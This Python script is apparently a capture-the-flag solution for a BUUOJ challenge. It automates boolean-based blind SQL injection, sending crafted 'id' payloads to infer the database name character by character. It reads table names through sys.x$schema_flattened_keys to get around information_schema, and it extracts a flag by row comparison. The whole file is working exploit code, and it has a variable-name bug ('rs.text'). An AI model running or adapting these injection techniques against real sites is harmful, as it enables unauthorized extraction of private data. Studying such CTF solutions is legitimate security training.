import requests
import time

def get_database(url,strings):
    database_length = 1
    DBname = ''
    for i in range(1,100):
        data = {
            'id': "1&&(length(database()))="+str(i)
        }
        res = requests.post(url,data)
        if 'Nu1L' in res.text:
            database_length = i
            print('数据库长度为：'+str(database_length))
            break
    for i in range(1,database_length+1):
        for one_char in strings:
            data = {
                'id': "1&&substr(database()," + str(i) + ",1)='"+str(one_char)+"'"
            }
            res = requests.post(url,data)
            if 'Nu1L' in res.text:
                DBname = DBname + one_char
                print("\r", end="")
                print('正在获取数据库名称，当前已获取到'+str(i)+'位 | '+DBname.lower(), end='')
                break

def get_tablename(url,strings):
    TBname = ''
    print('表名字读取中...')
    for i in range(1, 100):
        for one_char in strings:
            data = {
                'id': "1&&substr((select group_concat(table_name) from sys.x$schema_flattened_keys where table_schema=database())," + str(
                    i) + ",1)='"+str(one_char)+"'"
            }
            time.sleep(0.05)
            res = requests.post(url,data)
            if 'Nu1L' in res.text:
                TBname = TBname + one_char
                print("\r", end="")
                print('表的名字为：' + TBname.lower(), end='')
                break
            if 'Nu1L' not in rs.text and one_char == '~':
                return ''

def get_column(url,strings):
    column_name = ''
    tmp = ''
    print('\nflag信息读取中...')
    for i in range(1, 100):
        for one_char in strings:
            one_char = column_name + one_char
            data = {
               'id':"1&&((select 1,'"+str(one_char)+"') > (select * from f1ag_1s_h3r3_hhhhh))"
            }
            time.sleep(0.05)
            res = requests.post(url,data)
            if 'Nu1L' not in res.text:
                tmp = one_char
            if 'Nu1L' in res.text:
                column_name = tmp
                print("\r", end="")
                print('flag为：' + column_name.lower(), end='')
                break

if __name__ == '__main__':
    url = 'http://2968b420-1389-42a0-9c78-5c5b85df638a.node4.buuoj.cn:81/index.php'
    strings = ',-./0123456789:;<>=?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~#'
    get_database(url,strings)
    get_tablename(url,strings)
    #原来是想着获取column名称，但是未获取到，但是又懒得改名称，所以使用的是column
    get_column(url,strings)